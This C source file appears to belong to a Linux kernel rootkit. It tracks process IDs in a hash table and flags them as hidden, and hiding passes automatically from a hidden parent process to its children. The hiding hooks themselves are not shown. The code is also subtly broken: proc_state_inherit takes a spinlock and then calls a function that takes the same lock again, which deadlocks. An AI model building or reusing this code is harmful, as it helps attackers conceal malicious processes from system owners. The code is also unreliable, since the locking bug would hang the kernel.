#include <linux/slab.h>
#include <linux/spinlock.h>
#include "core/proc_state.h"

#define PROC_HASH_BITS 8

static DEFINE_HASHTABLE(proc_table, PROC_HASH_BITS);
static DEFINE_SPINLOCK(proc_lock);

int proc_state_init(void)
{
    hash_init(proc_table);
    return 0;
}

void proc_state_cleanup(void)
{
    struct proc_state *e;
    struct hlist_node *tmp;
    int b;

    spin_lock(&proc_lock);
    hash_for_each_safe(proc_table, b, tmp, e, node) {
        hash_del(&e->node);
        kfree(e);
    }
    spin_unlock(&proc_lock);
}

static struct proc_state *proc_lookup(pid_t pid)
{
    struct proc_state *e;
    hash_for_each_possible(proc_table, e, node, pid) {
        if (e->pid == pid)
            return e;
    }
    return NULL;
}

void proc_state_set(pid_t pid, pid_t ppid, u32 flags)
{
    struct proc_state *e;

    spin_lock(&proc_lock);
    e = proc_lookup(pid);
    if (!e) {
        e = kzalloc(sizeof(*e), GFP_ATOMIC);
        if (!e) {
            spin_unlock(&proc_lock);
            return;
        }
        e->pid  = pid;
        e->ppid = ppid;
        hash_add(proc_table, &e->node, pid);
    }
    e->flags |= flags;
    spin_unlock(&proc_lock);
}

void proc_state_clear(pid_t pid)
{
    struct proc_state *e;

    spin_lock(&proc_lock);
    e = proc_lookup(pid);
    if (e) {
        hash_del(&e->node);
        kfree(e);
    }
    spin_unlock(&proc_lock);
}

bool proc_is_hidden(pid_t pid)
{
    struct proc_state *e;
    bool hidden = false;

    spin_lock(&proc_lock);
    e = proc_lookup(pid);
    if (e && (e->flags & (PROC_HIDDEN_SELF | PROC_HIDDEN_INHERITED)))
        hidden = true;
    spin_unlock(&proc_lock);

    return hidden;
}

void proc_state_inherit(pid_t parent, pid_t child)
{
    struct proc_state *p;

    spin_lock(&proc_lock);
    p = proc_lookup(parent);
    if (p && (p->flags & (PROC_HIDDEN_SELF | PROC_HIDDEN_INHERITED))) {
        proc_state_set(child, parent, PROC_HIDDEN_INHERITED);
    }
    spin_unlock(&proc_lock);
}
